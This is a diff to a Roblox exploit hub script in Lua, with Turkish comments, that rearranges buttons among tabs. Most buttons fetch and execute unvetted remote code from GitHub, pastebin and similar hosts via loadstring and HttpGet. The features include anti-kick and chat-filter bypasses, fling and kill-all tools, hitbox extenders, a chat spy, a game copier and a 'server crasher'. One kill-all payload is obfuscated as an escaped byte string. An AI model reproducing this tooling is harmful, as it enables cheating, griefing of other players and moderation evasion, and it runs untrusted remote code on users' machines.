@@ -136,9 +136,6 @@ local sectionGames = tabGames:NewSection("Games GUIs/HUBs/Scripts")
 local HUBS = Window:NewTab("HUBS")
 local sectionHUBS = HUBS:NewSection("HUBS/GUIS")
 
-local FE = Window:NewTab("FE V2")
-local FESection = FE:NewSection("FE V2 SCRIPTS")
-
 local SPY = Window:NewTab("Remote SPYS")
 local spySection = SPY:NewSection("Remote Finders/Scanners")
 
@@ -151,9 +148,6 @@ local sectionPlayer = tabClient:NewSection("Player Mods")
 local sectionESP = tabClient:NewSection("ESP")
 local sectionExtras = tabClient:NewSection("Extras")
 
-local Chat = Window:NewTab("Chat Bypass")
-local ChatSection = Chat:NewSection("Chat Bypasser")
-
 -- =========================
 -- BYPASS
 -- =========================
@@ -164,6 +158,14 @@ end)
 
 sectionBypass:NewButton("Anti-Kick Bypass", "Anti-Kick Bypass", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Anti-Kick/main/Anti-Kick.lua"))()
+end)
+
+sectionBypass:NewButton("Fe Catbypasser", "Catbypasser", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/shadow62x/catbypass/main/upfix"))()
+end)
+
+sectionBypass:NewButton("Fe Gaze Bypass V4", "Works all games", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gaze-bypass-Altered-21081"))()
 end)
 
 -- =========================
@@ -210,6 +212,14 @@ sectionGames:NewButton("Blox Fruits", "Blox Fruits", function()
 }
 getgenv().BETA_VERSION = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Scripts/refs/heads/main/main.luau"))(Settings)
+end)
+
+sectionGames:NewButton("FE Brookhaven SP HUB","BEST", function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()
+end)
+
+sectionGames:NewButton("Brookhaven Sander XY NEW", "BEST", function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/testUIDK/refs/heads/main/panel.lua"))()
 end)
 
 sectionGames:NewButton("99 Nights(GOD MODE)", "99 Nights(GOD MODE)", function()
@@ -260,22 +270,6 @@ end)
 
 sectionGames:NewButton("Steal A Brainrot", "Steal A Brainrot", function()
      loadstring(game:HttpGet("https://koronis.xyz/hub.lua"))()
-end)
-
-sectionGames:NewButton("FE Brookhaven SP HUB","BEST", function()
-     loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()
-end)
-
-sectionGames:NewButton("Brookhaven Sander XY NEW", "BEST", function()
-     loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/testUIDK/refs/heads/main/panel.lua"))()
-end)
-
-sectionGames:NewButton("Brookhaven Sander X 4.2.2", "Brookhaven HUB", function()
-     loadstring(game:HttpGet('https://raw.githubusercontent.com/kigredns/SanderXV4.2.2/refs/heads/main/New.lua'))()
-end)
-
-sectionGames:NewButton("Brookhaven Sander X 3.30", "Brookhaven HUB", function()
-     loadstring(game:HttpGet(('https://raw.githubusercontent.com/sXPiterXs1111/Sanderxv3.30/main/sanderx3.30')))()
 end)
 
 sectionGames:NewToggle("FE Brookhaven Aura(Reactor Uptade)", "FE Brookhaven Aura(Reactor Uptade)", function()
@@ -419,8 +413,8 @@ sectionFE:NewButton("FE Fling All", "Tüm oyuncuları fırlatır", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 end)
 
-sectionFE:NewButton("SkyHub GUI", "Trolling GUI açar", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
+sectionFE:NewButton("Fly GUI", "Fly GUI açar", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
 end)
 
 sectionFE:NewButton("Dex Explorer", "Gelişmiş explorer tool", function()
@@ -524,82 +518,162 @@ sectionFE:NewToggle("Anti Kick / Ban", "Kick veya banlanmayı engellemeye çalı
         end
     end
 end)
-
---FE V2
-
-FESection:NewButton("FE Btools", "FE Btools", function()
+sectionFE:NewButton("FE Btools", "FE Btools", function()
     loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
 end)
 
-FESection:NewButton("FE Free PS(DIRECT)", "FE Free PS(DIRECT)", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/veil0x14/LocalScripts/refs/heads/main/pg.lua"))()
+sectionFE:NewButton("FE Server Crasher(Need Jacket)", "Need jacket you can reset fot stop", function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+if not player then
+    warn("LocalPlayer bulunamadı. Executor LocalPlayer sağlamıyor olabilir.")
+    return
+end
+
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid", 5)
+if not humanoid then
+    warn("Humanoid bulunamadı.")
+    return
+end
+
+local input = "113633503026070"
+
+local function extractIdFromInput(s)
+    if not s then return nil end
+    if type(s) == "number" then return s end
+    if type(s) ~= "string" then return nil end
+    local n = tonumber(s)
+    if n then return n end
+    local patterns = {
+        "rbxassetid://(%d+)",
+        "roblox%.com/catalog/(%d+)",
+        "roblox%.com/library/(%d+)",
+        "roblox%.com/asset/%?id=(%d+)",
+        "assetId=(%d+)",
+        "id=(%d+)"
+    }
+    for _, pat in ipairs(patterns) do
+        local m = string.match(s, pat)
+        if m then return tonumber(m) end
+    end
+    local anynum = string.match(s, "(%d%d%d%d%d%d%d%d%d%d%d+)")
+    if anynum then return tonumber(anynum) end
+    return nil
+end
+
+local id = extractIdFromInput(input)
+if not id then
+    warn("Geçerli bir Animation ID'si bulunamadı. Girdi: " .. tostring(input))
+    return
+end
+
+local ok, objs = pcall(function()
+    return game:GetObjects("rbxassetid://" .. tostring(id))
 end)
 
-FESection:NewButton("FE Cat Script", "FE Cat Script", function()
+local animInstance
+if ok and objs and #objs > 0 and objs[1]:IsA("Animation") then
+    animInstance = objs[1]
+    print("Animation object pulled from asset; using embedded AnimationId:", tostring(animInstance.AnimationId))
+else
+    animInstance = Instance.new("Animation")
+    animInstance.AnimationId = "rbxassetid://" .. tostring(id)
+    print("Fallback: using rbxassetid://", animInstance.AnimationId)
+end
+
+local success, trackOrErr = pcall(function()
+    return humanoid:LoadAnimation(animInstance)
+end)
+
+if not success or not trackOrErr then
+    warn("Humanoid:LoadAnimation başarısız olabilir. Hata:", tostring(trackOrErr))
+    return
+end
+
+local track = trackOrErr
+track.Priority = Enum.AnimationPriority.Action
+track.Looped = true
+
+local playOk, playErr = pcall(function()
+    track:Play()
+end)
+if not playOk then
+    warn("Animasyon oynatılırken hata:", tostring(playErr))
+else
+    print("Animation playing (ID):", id)
+end
+end)
+
+sectionFE:NewButton("FE Free PS(DIRECT)", "FE Free PS(DIRECT)", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/veil0x14/LocalScripts/refs/heads/main/pg.lua"))()
+end)
+
+sectionFE:NewButton("FE Cat Script", "FE Cat Script", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/Y1MkBRn3"))()
 end)
 
-FESection:NewButton("FE Universal Hitbox Extender", "FE Universal Hitbox Extender", function()
+sectionFE:NewButton("FE Universal Hitbox Extender", "FE Universal Hitbox Extender", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/AAPVdev/scripts/refs/heads/main/UI_LimbExtender.lua'))()
 end)
 
-FESection:NewButton("FE Grab Knife(Works on Backdoored Games)", "FE Grab Knife(Works on Backdoored Games)", function()
+sectionFE:NewButton("FE Grab Knife(Works on Backdoored Games)", "FE Grab Knife(Works on Backdoored Games)", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt", true))()
 end)
 
-FESection:NewButton("FE Touch Fling", "FE Touch Fling", function()
+sectionFE:NewButton("FE Touch Fling", "FE Touch Fling", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/LgZwZ7ZB",true))()
 end)
 
-FESection:NewButton("FE Part Invisiblty", "FE Part Invisiblty", function()
+sectionFE:NewButton("FE Part Invisiblty", "FE Part Invisiblty", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/hiuDUqFS"))()
 end)
 
-FESection:NewButton("FE Choke", "FE Choke", function()
+sectionFE:NewButton("FE Choke", "FE Choke", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/shakk-code/fe-choke-script/refs/heads/main/script.lua', true))()
 end)
 
-FESection:NewButton("FE Gravity Gun", "FE Gravity Gun", function()
+sectionFE:NewButton("FE Gravity Gun", "FE Gravity Gun", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/gravity%20gun"))()
 end)
 
-FESection:NewButton("FE Sharingan Script", "FE Sharingan Script", function()
+sectionFE:NewButton("FE Sharingan Script", "FE Sharingan Script", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/bidQM5Bz"))()
 end)
 
-FESection:NewButton("FE Scp 096", "FE Scp 096", function()
+sectionFE:NewButton("FE Scp 096", "FE Scp 096", function()
     loadstring(game:HttpGet("https://pastefy.app/YsJgITXR/raw"))()
 end)
 
-FESection:NewButton("FE Roblox Egor", "FE Roblox Egor", function()
+sectionFE:NewButton("FE Roblox Egor", "FE Roblox Egor", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/GithubMagical/Roblox-Egor/refs/heads/main/lua%20v2", true))()
 end)
 
-FESection:NewButton("FE Sandevistan Script", "FE Sandevistan Script", function()
+sectionFE:NewButton("FE Sandevistan Script", "FE Sandevistan Script", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/idbiRMZG"))()
 end)
 
-FESection:NewButton("FE Bring Unanchored", "FE Bring Unanchored", function()
+sectionFE:NewButton("FE Bring Unanchored", "FE Bring Unanchored", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ArceusXArchivezx/Game/refs/heads/main/ArceusXArchive"))()
 end)
 
-FESection:NewButton("FE Bang", "FE Bang", function()
+sectionFE:NewButton("FE Bang", "FE Bang", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/4gh9/Bang-Script-Gui/main/bang%20gui.lua'))()
 end)
 
-FESection:NewButton("FE Universal Viewer", "FE Universal Viewer", function()
+sectionFE:NewButton("FE Universal Viewer", "FE Universal Viewer", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/KmiuAFZh"))()
 end)
 
-FESection:NewButton("FE Chat Spy", "FE Chat Spy", function()
+sectionFE:NewButton("FE Chat Spy", "FE Chat Spy", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/CHAT%20SPY%20-%202025/ChatSpy2025.lua', true))()
 end)
 
-FESection:NewButton("FE Kill All(Sword)", "Sword Needed", function()
+sectionFE:NewButton("FE Kill All(Sword)", "Sword Needed", function()
     loadstring("\108\111\99\97\108\32\76\80\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\10\119\104\105\108\101\32\119\97\105\116\40\48\46\49\41\32\100\111\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\58\71\101\116\80\108\97\121\101\114\115\40\41\41\32\100\111\10\105\102\32\118\32\97\110\100\32\118\46\67\104\97\114\97\99\116\101\114\32\97\110\100\32\118\32\126\61\32\76\80\32\97\110\100\32\118\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\32\116\104\101\110\10\108\111\99\97\108\32\104\114\112\32\61\32\118\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\32\10\104\114\112\58\66\114\101\97\107\74\111\105\110\116\115\40\41\10\104\114\112\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\10\104\114\112\46\66\114\105\99\107\67\111\108\111\114\32\61\32\118\46\84\101\97\109\67\111\108\111\114\10\104\114\112\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\104\114\112\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10\104\114\112\46\67\70\114\97\109\101\32\61\32\76\80\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\42\32\67\70\114\97\109\101\46\110\101\119\40\49\44\48\44\45\51\46\53\41\10\101\110\100\41\10\101\110\100\10\101\110\100\10\101\110\100\10")()
 end)
 
-FESection:NewButton("FE AFK", "Oyundan atılmamanı sağlar", function()
+sectionFE:NewButton("FE AFK", "Oyundan atılmamanı sağlar", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/jonashstudio/Antiafk/refs/heads/main/Anti%20afk"))()
 end)
 
@@ -608,7 +682,7 @@ end)
 
 
 
-FESection:NewButton("Collision Enabler", "Collision Enabler", function()
+sectionFE:NewButton("Collision Enabler", "Collision Enabler", function()
 LP = game.Players.LocalPlayer
 while wait(3) do
     for i,v in pairs(game.Players:GetDescendants()) do
@@ -635,7 +709,7 @@ end)
 
 
 
-FESection:NewButton("FE Copier", "Oyun kopyalayıcı", function()
+sectionFE:NewButton("FE Game Copier", "FE Game Copier", function()
     local Params = {
  RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
  SSI = "saveinstance",
@@ -645,7 +719,7 @@ local Options = {} -- Documentation here https://luau.github.io/UniversalSynSave
 synsaveinstance(Options)
 end)
 
-FESection:NewButton("FE Part Controller", "Anchored Parts", function()
+sectionFE:NewButton("FE Part Controller", "Anchored Parts", function()
 pcall(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PartController/refs/heads/main/PartController.lua", true))()
 end)
@@ -827,9 +901,6 @@ UserInputService.InputBegan:Connect(function(input, gp)
     end
 end)
 
-sectionExtras:NewButton("Fly GUI", "Fly GUI açar", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
-end)
 
 -- ESP
 
@@ -910,16 +981,6 @@ end)
 
 Players.PlayerRemoving:Connect(function()
     updateESP()
-end)
-
---Chat Bypass
-
-ChatSection:NewButton("Fe Catbypasser", "Catbypasser", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/shadow62x/catbypass/main/upfix"))()
-end)
-
-ChatSection:NewButton("Fe Gaze Bypass V4", "Works all games", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gaze-bypass-Altered-21081"))()
 end)
 
 -- Extras
@@ -1124,6 +1185,10 @@ end)
 -- ANIMATIONS
 -- =========================
 
+sectionAnimations:NewButton("FE Animation Player", "FE Animation Player", function()
+     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Emote-Player-51936"))()
+end)
+
 sectionAnimations:NewButton("FE Aqua Matrix", "FE Scripts", function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
 end)
@@ -1146,6 +1211,10 @@ end)
 
 sectionHUBS:NewButton("c00lclan", "c00lkidd gelişmiş gui", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/14EU4i8n",true))()
+end)
+
+sectionHUBS:NewButton("SkyHub GUI", "Trolling GUI açar", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
 end)
 
 sectionHUBS:NewButton("FE Fling GUI", "FE Fling GUI", function()
